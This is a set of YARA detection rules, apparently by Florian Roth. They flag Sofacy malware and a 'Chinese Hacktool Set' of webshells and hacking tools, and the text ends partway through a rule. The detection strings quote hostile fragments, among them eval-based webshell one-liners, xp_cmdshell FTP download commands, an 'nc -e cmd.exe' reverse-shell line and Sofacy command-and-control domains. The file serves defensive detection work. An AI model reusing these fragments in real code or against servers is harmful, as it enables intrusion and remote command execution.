rule Sofacy_Mal2_RID2B21 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "Sofacy Group Malware Sample 2"
      author = "Florian Roth"
      reference = "http://dokumente.linksfraktion.de/inhalt/report-orig.pdf"
      date = "2015-06-19 08:53:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "PROJECT\\XAPS_OBJECTIVE_DLL\\" ascii
      $x2 = "XAPS_OBJECTIVE.dll" fullword ascii
      $s1 = "i`m wait" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) ) and $s1
} 

rule Sofacy_Mal3_RID2B22 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "Sofacy Group Malware Sample 3"
      author = "Florian Roth"
      reference = "http://dokumente.linksfraktion.de/inhalt/report-orig.pdf"
      date = "2015-06-19 08:53:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "shell\\open\\command=\"System Volume Information\\USBGuard.exe\" install" fullword ascii
      $s2 = ".?AVAgentModuleRemoteKeyLogger@@" fullword ascii
      $s3 = "<font size=4 color=red>process isn't exist</font>" fullword ascii
      $s4 = "<font size=4 color=red>process is exist</font>" fullword ascii
      $s5 = ".winnt.check-fix.com" fullword ascii
      $s6 = ".update.adobeincorp.com" fullword ascii
      $s7 = ".microsoft.checkwinframe.com" fullword ascii
      $s8 = "adobeincorp.com" fullword wide
      $s9 = "# EXC: HttpSender - Cannot create Get Channel!" fullword ascii
      $x1 = "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox/" wide
      $x2 = "User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/2" wide
      $x3 = "C:\\Windows\\System32\\cmd.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( 2 of ( $s* ) or ( 1 of ( $s* ) and all of ( $x* ) ) )
} 

rule Webshell_Txt_aspx1_RID2E32 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspx1.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:04:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[" 
      $s1 = "],\"unsafe\");%>" fullword ascii
   condition: 
      filesize < 150 and all of them
} 

rule Webshell_Shell_Asp_RID2E21 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set Webshells - file Asp.html"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:01:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
      $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
      $s3 = "function Command(cmd, str){" fullword ascii
   condition: 
      filesize < 100KB and all of them
} 

rule Webshell_Txt_aspxtag_RID2F3D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspxtag.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:48:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "String wGetUrl=Request.QueryString[" fullword ascii
      $s2 = "sw.Write(wget);" fullword ascii
      $s3 = "Response.Write(\"Hi,Man 2015\"); " fullword ascii
   condition: 
      filesize < 2KB and all of them
} 

rule Webshell_Txt_php_RID2D8D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file php.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:36:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$Config=$_SERVER['QUERY_STRING'];" fullword ascii
      $s2 = "gzuncompress($_SESSION['api']),null);" ascii
      $s3 = "sprintf('%s?%s',pack(\"H*\"," ascii
      $s4 = "if(empty($_SESSION['api']))" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule Webshell_Txt_shell_RID2E5D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file shell.c"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:11:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "printf(\"Could not connect to remote shell!\\n\");" fullword ascii
      $s2 = "printf(\"Usage: %s <reflect ip> <port>\\n\", prog);" fullword ascii
      $s3 = "execl(shell,\"/bin/sh\",(char *)0);" fullword ascii
      $s4 = "char shell[]=\"/bin/sh\";" fullword ascii
      $s5 = "connect back door\\n\\n\");" fullword ascii
   condition: 
      filesize < 2KB and 2 of them
} 

rule Webshell_Txt_asp_RID2D89 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file asp.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:36:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol" ascii
      $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 100KB and all of them
} 

rule Webshell_Txt_asp1_RID2DBA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file asp1.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:44:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
      $s2 = "autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
      $s3 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
      $s4 = "szTempFile = server.mappath(\"cmd.txt\")" fullword ascii
   condition: 
      filesize < 70KB and 2 of them
} 

rule Webshell_Txt_php_2_RID2E1E : DEMO T1016 T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file php.html"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:00:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1016, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "function connect($dbhost, $dbuser, $dbpass, $dbname='') {" fullword ascii
      $s2 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s3 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s4 = "Powered by <a title=\"Build 20130112\" href=\"http://www.4ngel.net\" target=\"_b" ascii
      $s5 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this." ascii
      $s6 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
      $s7 = "secparam('Hosts', @file_get_contents('/etc/hosts'));" fullword ascii
      $s8 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=" ascii
   condition: 
      filesize < 100KB and 4 of them
} 

rule Webshell_Txt_ftp_RID2D8F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file ftp.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:37:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "';exec master.dbo.xp_cmdshell 'echo open " ascii
      $s2 = "';exec master.dbo.xp_cmdshell 'ftp -s:';" ascii
      $s3 = "';exec master.dbo.xp_cmdshell 'echo get lcx.exe" ascii
      $s4 = "';exec master.dbo.xp_cmdshell 'echo get php.exe" ascii
      $s5 = "';exec master.dbo.xp_cmdshell 'copy " ascii
      $s6 = "ftp -s:d:\\ftp.txt " fullword ascii
      $s7 = "echo bye>>d:\\ftp.txt " fullword ascii
   condition: 
      filesize < 2KB and 2 of them
} 

rule Webshell_Txt_lcx_RID2D8C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file lcx.c"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:36:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "printf(\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l" ascii
      $s2 = "sprintf(tmpbuf2,\"\\r\\n########### reply from %s:%d ####################\\r\\n" ascii
      $s3 = "printf(\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\r\\n\");" fullword ascii
      $s4 = "printf(\"got,ip:%s,port:%d\\r\\n\",inet_ntoa(client1.sin_addr),ntohs(client1.sin" ascii
      $s5 = "printf(\"[-] connect to host1 failed\\r\\n\");" fullword ascii
   condition: 
      filesize < 25KB and 2 of them
} 

rule Webshell_Txt_jspcmd_RID2EC6 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file jspcmd.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:28:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
      $s4 = "out.print(\"Hi,Man 2015\");" fullword ascii
   condition: 
      filesize < 1KB and 1 of them
} 

rule Webshell_Txt_jsp_RID2D92 : DEMO T1007 T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file jsp.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:37:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1007, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
      $s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
      $s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
      $s4 = "cmd = \"cmd.exe /c set\";" fullword ascii
   condition: 
      filesize < 715KB and 2 of them
} 

rule Webshell_Txt_aspxlcx_RID2F48 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspxlcx.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:50:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "public string remoteip = " ascii
      $s2 = "=Dns.Resolve(host);" ascii
      $s3 = "public string remoteport = " ascii
      $s4 = "public class PortForward" ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 18KB and all of them
} 

rule Webshell_Txt_xiao_RID2DF6 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file xiao.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:54:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
      $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
      $s3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED," ascii
      $s4 = "function Command(cmd, str){" fullword ascii
      $s5 = "echo \"if(obj.value=='PageWebProxy')obj.form.target='_blank';\"" fullword ascii
   condition: 
      filesize < 100KB and all of them
} 

rule Webshell_Txt_aspx_RID2E01 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspx.jpg"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:56:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
      $s2 = "Process[] p=Process.GetProcesses();" fullword ascii
      $s3 = "Copyright &copy; 2009 Bin" ascii
      $s4 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"serv" ascii
   condition: 
      filesize < 100KB and all of them
} 

rule Webshell_Txt_Sql_RID2D75 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file Sql.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:32:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd=chr(34)&\"cmd.exe /c \"&request.form(\"cmd\")&\" > 8617.tmp\"&chr(34)" fullword ascii
      $s2 = "strQuery=\"dbcc addextendedproc ('xp_regwrite','xpstar.dll')\"" fullword ascii
      $s3 = "strQuery = \"exec master.dbo.xp_cmdshell '\" & request.form(\"cmd\") & \"'\" " fullword ascii
      $s4 = "session(\"login\")=\"\"" fullword ascii
   condition: 
      filesize < 15KB and all of them
} 

rule Webshell_Txt_hello_RID2E59 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file hello.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:10:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Dim myProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
      $s1 = "myProcessStartInfo.Arguments=\"/c \" & Cmd.text" fullword ascii
      $s2 = "myProcess.Start()" fullword ascii
      $s3 = "<p align=\"center\"><a href=\"?action=cmd\" target=\"_blank\">" fullword ascii
   condition: 
      filesize < 25KB and all of them
} 

rule CN_Tools_xbat_RID2C20 : APT CHINA DEMO FILE T1136 {
   meta:
      description = "Chinese Hacktool Set - file xbat.vbs"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:35:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "ws.run \"srss.bat /start\",0 " fullword ascii
      $s1 = "Set ws = Wscript.CreateObject(\"Wscript.Shell\")" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x6553 and filesize < 0KB and all of them
} 

rule CN_Tools_srss_RID2C3C : APT CHINA DEMO T1136 {
   meta:
      description = "Chinese Hacktool Set - file srss.bat"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:40:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "srss.exe -idx 0 -ip" 
      $s1 = "-port 21 -logfilter \"_USER ,_P" ascii
   condition: 
      filesize < 100 and all of them
} 

rule dll_UnReg_RID2A8D : APT DEMO T1117 T1136 {
   meta:
      description = "Chinese Hacktool Set - file UnReg.bat"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 06:46:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1117, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "regsvr32.exe /u C:\\windows\\system32\\PacketX.dll" fullword ascii
      $s1 = "del /F /Q C:\\windows\\system32\\PacketX.dll" fullword ascii
   condition: 
      filesize < 1KB and 1 of them
} 

rule dll_Reg_RID29CA : APT DEMO T1117 T1136 {
   meta:
      description = "Chinese Hacktool Set - file Reg.bat"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 01:21:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1117, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "copy PacketX.dll C:\\windows\\system32\\PacketX.dll" fullword ascii
      $s1 = "regsvr32.exe C:\\windows\\system32\\PacketX.dll" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule sbin_squid_RID2B42 : APT DEMO T1007 T1136 {
   meta:
      description = "Chinese Hacktool Set - file squid.bat"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:58:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1007, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "del /s /f /q" fullword ascii
      $s1 = "squid.exe -z" fullword ascii
      $s2 = "net start Squid" fullword ascii
      $s3 = "net stop Squid" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule CN_Tools_Temp_RID2C07 : APT CHINA DEMO FILE T1136 {
   meta:
      description = "Chinese Hacktool Set - file Temp.war"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:31:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "META-INF/context.xml<?xml version=\"1.0\" encoding=\"UTF-8\"?>" fullword ascii
      $s1 = "browser.jsp" fullword ascii
      $s3 = "cmd.jsp" fullword ascii
      $s4 = "index.jsp" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 203KB and all of them
} 

rule sql1433_creck_RID2B93 : APT DEMO FILE T1136 {
   meta:
      description = "Chinese Hacktool Set - file creck.bat"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:12:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "start anhao3.exe -i S.txt -p  pass3.txt -o anhao.txt -l Them.txt -t 1000" fullword ascii
      $s1 = "start anhao1.exe -i S.txt -p  pass1.txt -o anhao.txt -l Them.txt -t 1000" fullword ascii
      $s2 = "start anhao2.exe -i S.txt -p  pass2.txt -o anhao.txt -l Them.txt -t 1000" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x7473 and filesize < 1KB and 1 of them
} 

rule sql1433_Start_RID2B99 : APT DEMO T1136 {
   meta:
      description = "Chinese Hacktool Set - file Start.bat"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:13:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
      $s2 = "start creck.bat" fullword ascii
      $s3 = "del s1.txt" fullword ascii
      $s4 = "del Result.txt" fullword ascii
      $s5 = "del s.TXT" fullword ascii
      $s6 = "mode con cols=48 lines=20" fullword ascii
   condition: 
      filesize < 1KB and 2 of them
} 

rule Webshell_ChinaChopper_one_RID30FB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file one.asp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:03:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%eval request(" fullword ascii
   condition: 
      filesize < 50 and all of them
} 

rule Webshell_f3_diy_RID2CE4 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file diy.asp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:08:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
      $s5 = ".black {" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 10KB and all of them
} 

rule Webshell_ChinaChopper_temp_2_RID3200 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file temp.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:46:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@eval($_POST[strtoupper(md5(gmdate(" ascii
   condition: 
      filesize < 150 and all of them
} 

rule Webshell_templatr_RID2E0F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file templatr.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:58:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "eval(gzinflate(base64_decode('" ascii
   condition: 
      filesize < 70KB and all of them
} 

rule Pc_pc2015_RID29BE : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file pc2015.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 01:01:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\svchost.exe" fullword ascii
      $s1 = "LON\\OD\\O-\\O)\\O%\\O!\\O=\\O9\\O5\\O1\\O" fullword ascii
      $s8 = "%s%08x.001" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 309KB and all of them
} 

rule Dos_1_RID28C7 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file 1.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 18:10:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/churrasco/-->Usage: Churrasco.exe \"command to run\"" fullword ascii
      $s2 = "/churrasco/-->Done, command should have ran as SYSTEM!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule Cmdshell32_RID2AA2 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Cmdshell32_RID2AA2.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 07:21:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmdshell.exe" fullword wide
      $s2 = "cmdshell" fullword ascii
      $s3 = "[Root@CmdShell ~]#" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 62KB and all of them
} 

rule Dos_Down32_RID2A93 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Down32.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 06:56:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "C:\\Windows\\Temp\\Cmd.txt" fullword wide
      $s6 = "down.exe" fullword wide
      $s15 = "get_Form1" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 137KB and all of them
} 

rule dat_report_RID2B45 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file report.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:59:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<a href=\"http://www.xfocus.net\">X-Scan</a>" fullword ascii
      $s2 = "REPORT-ANALYSIS-OF-HOST" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 480KB and all of them
} 

rule SwitchSniffer_RID2C50 : DEMO EXE FILE HKTL T1040 T1136 {
   meta:
      description = "Chinese Hacktool Set - file SwitchSniffer_RID2C50.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:43:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1040, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "NextSecurity.NET" fullword wide
      $s2 = "SwitchSniffer_RID2C50 Setup" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of them
} 

rule hscan_gui_RID2AC2 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file hscan-gui.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:15:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Hscan.EXE" fullword wide
      $s1 = "RestTool.EXE" fullword ascii
      $s3 = "Hscan Application " fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them
} 

rule dat_xpf_RID29F7 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file xpf.sys"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 02:36:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "UnHook IoGetDeviceObjectPointer ok!" fullword ascii
      $s2 = "\\Device\\XScanPF" fullword wide
      $s3 = "\\DosDevices\\XScanPF" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 25KB and all of them
} 

rule Arp_EMP_v1_0_RID2B0A : DEMO EXE FILE HKTL T1136 {
   meta:
